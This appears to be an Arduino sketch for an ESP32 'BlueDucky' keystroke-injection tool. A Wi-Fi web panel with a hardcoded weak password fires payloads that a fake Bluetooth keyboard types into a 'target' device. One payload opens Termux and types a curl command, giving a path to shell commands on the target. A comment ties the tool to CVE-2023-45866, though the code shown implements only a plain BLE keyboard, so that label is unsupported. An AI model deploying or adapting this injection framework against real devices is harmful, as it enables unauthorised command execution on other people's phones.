#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoJson.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include "BLEHIDDevice.h"
#include "HIDKeyboardTypes.h"

// =========================================================================
// WiFi & Web Server Configuration
// =========================================================================
const char* ssid = "ESP32-HID-Controller";
const char* password = "password123";

AsyncWebServer server(80);
BLEHIDDevice* hid;
BLECharacteristic* inputKeyboard;
bool deviceConnected = false;

// --- HTML Web Page Content (stored in Flash memory) ---
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html>
<head>
  <title>ESP32 HID Controller</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html { font-family: Helvetica; display: inline-block; margin: 0px auto; text-align: center; }
    body { background-color: #f0f0f0; }
    h1 { color: #0F3376; padding: 2vh; }
    .button { display: inline-block; background-color: #1abc9c; border: none; border-radius: 4px; color: white; padding: 16px 40px; text-decoration: none; font-size: 30px; margin: 2px; cursor: pointer; transition: background-color 0.3s; }
    .button:hover { background-color: #16a085; }
    .button-media { background-color: #34495e; }
    .button-media:hover { background-color: #2c3e50; }
    .button-action { background-color: #e67e22; }
    .button-action:hover { background-color: #d35400; }
    p { font-size: 14px; color: #888; margin-bottom: 10px; }
    .status { font-size: 16px; color: #333; margin: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h1>ESP32 BlueDucky Controller</h1>
  <p class="status" id="status">Connecting to ESP32...</p>
  
  <button class="button" onclick="sendPayload('open_youtube')">Open YouTube</button>
  <button class="button" onclick="sendPayload('open_spotify')">Open Spotify</button>
  
  <p style="margin-top: 20px;">Media Controls</p>
  <button class="button button-media" onclick="sendPayload('play_pause')">Play/Pause</button>
  <button class="button button-media" onclick="sendPayload('next_track')">Next Track</button>
  
  <p style="margin-top: 20px;">Actions</p>
  <button class="button button-action" onclick="sendPayload('curl_example')">Run cURL</button>
  <button class="button button-action" onclick="sendPayload('skip_ad')">Skip Ad</button>

  <script>
    // Check connection status on load
    fetch('/status')
      .then(response => response.text())
      .then(isConnected => {
        document.getElementById('status').innerText = isConnected === 'true' ? 'Target Connected' : 'Waiting for Target...';
      });

    function sendPayload(payloadName) {
      console.log("Sending payload: " + payloadName);
      document.getElementById('status').innerText = 'Executing...';
      
      fetch('/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: payloadName })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        console.log('Payload sent successfully!');
        document.body.style.backgroundColor = "#e8f5e9"; // Light green flash
        setTimeout(() => { document.body.style.backgroundColor = "#f0f0f0"; }, 300);
        document.getElementById('status').innerText = 'Success!';
      })
      .catch(error => {
        console.error('Error sending payload:', error);
        document.body.style.backgroundColor = "#ffebee"; // Light red flash
        setTimeout(() => { document.body.style.backgroundColor = "#f0f0f0"; }, 300);
        document.getElementById('status').innerText = 'Error!';
      });
    }
  </script>
</body>
</html>
)rawliteral";

// --- BLE Server Callbacks ---
class MyServerCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer* pServer) {
    deviceConnected = true;
    Serial.println("✅ Target device connected via BLE!");
    BLE2902* desc = (BLE2902*)inputKeyboard->getDescriptorByUUID(BLEUUID((uint16_t)0x2902));
    desc->setNotifications(true);
  }
  void onDisconnect(BLEServer* pServer) {
    deviceConnected = false;
    Serial.println("❌ Target device disconnected. Restarting advertising.");
    BLEAdvertising* pAdvertising = pServer->getAdvertising();
    pAdvertising->start();
  }
};

// =========================================================================
// HID Keyboard Emulation Functions
// =========================================================================
void typeString(const char* text) {
  if (!deviceConnected) return;
  Serial.printf("Typing: %s\n", text);
  for (int i = 0; text[i] != '\0'; i++) {
    char c = text[i];
    uint8_t keycode = 0;
    uint8_t modifier = 0;

    if (c >= 'a' && c <= 'z') {
      keycode = KEY_A + (c - 'a');
    } else if (c >= 'A' && c <= 'Z') {
      keycode = KEY_A + (c - 'A');
      modifier = KEY_LEFT_SHIFT;
    } else if (c >= '1' && c <= '9') {
      keycode = KEY_1 + (c - '1');
    } else if (c == '0') {
      keycode = KEY_0;
    } else if (c == ' ') {
      keycode = KEY_SPACE;
    } else if (c == '.') {
      keycode = KEY_DOT;
    } else if (c == '-') {
      keycode = KEY_MINUS;
    } else if (c == '/') {
      keycode = KEY_SLASH;
    }
    // Add more character mappings as needed

    if (keycode != 0) {
      uint8_t msg[] = {modifier, 0, keycode, 0, 0, 0, 0, 0};
      inputKeyboard->setValue(msg, sizeof(msg));
      inputKeyboard->notify();
      delay(12);
      uint8_t msg_release[] = {0, 0, 0, 0, 0, 0, 0, 0};
      inputKeyboard->setValue(msg_release, sizeof(msg_release));
      inputKeyboard->notify();
      delay(12);
    }
  }
}

void pressKey(uint8_t key, uint8_t modifier = 0) {
  if (!deviceConnected) return;
  Serial.printf("Pressing key: %d with modifier: %d\n", key, modifier);
  uint8_t msg[] = {modifier, 0, key, 0, 0, 0, 0, 0};
  inputKeyboard->setValue(msg, sizeof(msg));
  inputKeyboard->notify();
  delay(50);
  uint8_t msg_release[] = {0, 0, 0, 0, 0, 0, 0, 0};
  inputKeyboard->setValue(msg_release, sizeof(msg_release));
  inputKeyboard->notify();
}

// =========================================================================
// Payload Functions
// =========================================================================
void payload_openApp(const char* appName) {
  Serial.printf("Executing payload: Open App '%s'\n", appName);
  pressKey(KEY_LEFT_GUI); // Opens app drawer/search
  delay(500);
  typeString(appName);
  delay(300);
  pressKey(KEY_ENTER);
}

void payload_mediaControl(const char* action) {
  Serial.printf("Executing payload: Media Control '%s'\n", action);
  if (strcmp(action, "play_pause") == 0) pressKey(KEY_MEDIA_PLAY_PAUSE);
  else if (strcmp(action, "next") == 0) pressKey(KEY_MEDIA_NEXT_TRACK);
  else if (strcmp(action, "prev") == 0) pressKey(KEY_MEDIA_PREVIOUS_TRACK);
  else if (strcmp(action, "vol_up") == 0) pressKey(KEY_MEDIA_VOLUME_UP);
  else if (strcmp(action, "vol_down") == 0) pressKey(KEY_MEDIA_VOLUME_DOWN);
  else if (strcmp(action, "mute") == 0) pressKey(KEY_MEDIA_MUTE);
}

void payload_customCurl(const char* command) {
  Serial.printf("Executing payload: Custom cURL '%s'\n", command);
  // Assumes Termux is installed
  payload_openApp("Termux");
  delay(1500); // Wait for Termux to load
  typeString("curl ");
  typeString(command);
  pressKey(KEY_ENTER);
}

void payload_autoSkipAd() {
  Serial.println("Executing payload: Auto-Skip Ad (Fragile!)");
  delay(8000); // Wait for ad to be skippable
  pressKey(KEY_TAB);
  delay(100);
  pressKey(KEY_TAB); // Might need a few tabs
  delay(100);
  pressKey(KEY_ENTER);
}

void payload_showNotification() {
  Serial.println("Executing payload: Show Notification Shade");
  // Not universally possible via HID, using a placeholder
  payload_openApp("Settings");
}


// =========================================================================
// Main Setup & Loop
// =========================================================================

void setup() {
  Serial.begin(115200);
  Serial.println("\n--- ESP32 BlueDucky Web Controller Starting ---");

  // --- WiFi & Web Server Setup ---
  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);

  // Route for root / web page
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html);
  });

  // Route for checking status
  server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(200, "text/plain", String(deviceConnected ? "true" : "false"));
  });

  // Route for executing payloads
  server.on("/execute", HTTP_POST, [](AsyncWebServerRequest *request) {
    Serial.println("Received command via web server.");
    if (request->contentLength() == 0) { request->send(400, "text/plain", "Error: No body"); return; }

    String body = request->arg("plain");
    DynamicJsonDocument doc(1024);
    DeserializationError error = deserializeJson(doc, body);
    if (error || !doc.containsKey("payload")) { request->send(400, "text/plain", "Error: Invalid JSON"); return; }

    const char* payloadName = doc["payload"];
    Serial.printf("Executing payload: %s\n", payloadName);

    // --- Payload Routing ---
    if (strcmp(payloadName, "open_youtube") == 0) payload_openApp("YouTube");
    else if (strcmp(payloadName, "open_spotify") == 0) payload_openApp("Spotify");
    else if (strcmp(payloadName, "play_pause") == 0) payload_mediaControl("play_pause");
    else if (strcmp(payloadName, "next_track") == 0) payload_mediaControl("next");
    else if (strcmp(payloadName, "curl_example") == 0) payload_customCurl("https://api.ipify.org?format=json");
    else if (strcmp(payloadName, "skip_ad") == 0) payload_autoSkipAd();
    else { request->send(404, "text/plain", "Error: Payload not found"); return; }

    request->send(200, "text/plain", "OK");
  });

  server.begin();
  Serial.println("HTTP server started.");

  // --- BLE HID Setup (CVE-2023-45866) ---
  BLEDevice::init("Bluetooth Keyboard");
  BLEServer* pServer = BLEDevice::createServer();
  pServer->setCallbacks(new MyServerCallbacks());
  hid = new BLEHIDDevice(pServer);
  inputKeyboard = hid->inputReport(1);
  hid->manufacturer()->setValue("ESP32");
  hid->pnp(0x02, 0x46e, 0x001, 0x01);
  hid->hidInfo(0x00, 0x01);
  
  const uint8_t reportMap[] = {
    USAGE_PAGE(1),      0x01,       // Generic Desktop Ctrls
    USAGE(1),           0x06,       // Keyboard
    COLLECTION(1),      0x01,       // Application
    REPORT_ID(1),       0x01,       //   Report ID (1)
    USAGE_PAGE(1),      0x07,       //   Kbrd/Keypad
    USAGE_MINIMUM(1),   0xE0,       //   Keyboard LeftControl
    USAGE_MAXIMUM(1),   0xE7,       //   Keyboard Right GUI
    LOGICAL_MINIMUM(1), 0x00,       //   0
    LOGICAL_MAXIMUM(1), 0x01,       //   1
    REPORT_SIZE(1),     0x01,       //   1 byte
    REPORT_COUNT(1),    0x08,       //   8 bits
    HIDINPUT(1),        0x02,       //   Data,Var,Abs,No Wrap,Linear,Preferred State,No Null Position
    REPORT_COUNT(1),    0x01,       //   1 byte (Reserved)
    REPORT_SIZE(1),     0x08,       //   8 bits
    HIDINPUT(1),        0x01,       //   Const,Array,Abs,No Wrap,Linear,Preferred State,No Null Position
    REPORT_COUNT(1),    0x05,       //   5 bits (Num lock, Caps lock, Scroll lock, Compose, Kana)
    REPORT_SIZE(1),     0x01,       //   1 bit
    USAGE_PAGE(1),      0x08,       //   LEDs
    USAGE_MINIMUM(1),   0x01,       //   Num Lock
    USAGE_MAXIMUM(1),   0x05,       //   Kana
    LOGICAL_MINIMUM(1), 0x00,       //   0
    LOGICAL_MAXIMUM(1), 0x01,       //   1
    HIDOUTPUT(1),       0x02,       //   Data,Var,Abs,No Wrap,Linear,Preferred State,No Null Position,Non-volatile
    REPORT_COUNT(1),    0x01,       //   3 bits (Padding)
    REPORT_SIZE(1),     0x03,       //   3 bits
    HIDOUTPUT(1),       0x01,       //   Const,Array,Abs,No Wrap,Linear,Preferred State,No Null Position,Non-volatile
    REPORT_COUNT(1),    0x06,       //   6 bytes (Keys)
    REPORT_SIZE(1),     0x08,       //   8 bits
    LOGICAL_MINIMUM(1), 0x00,       //   0
    LOGICAL_MAXIMUM(1), 0x65,       //   101
    USAGE_PAGE(1),      0x07,       //   Kbrd/Keypad
    USAGE_MINIMUM(1),   0x00,       //   Reserved (no event indicated)
    USAGE_MAXIMUM(1),   0x65,       //   Keyboard Application
    HIDINPUT(1),        0x00,       //   Data,Array,Abs,No Wrap,Linear,Preferred State,No Null Position
    END_COLLECTION(0)               // End collection
  };
  hid->reportMap((uint8_t*)reportMap, sizeof(reportMap));
  hid->startServices();

  BLEAdvertising* pAdvertising = pServer->getAdvertising();
  pAdvertising->setAppearance(HID_KEYBOARD);
  pAdvertising->addServiceUUID(hid->hidService()->getUUID());
  pAdvertising->start();
  Serial.println("✅ BLE HID Advertising started.");
}

void loop() {
  // Handled by async web server and BLE callbacks
  delay(1000);
}
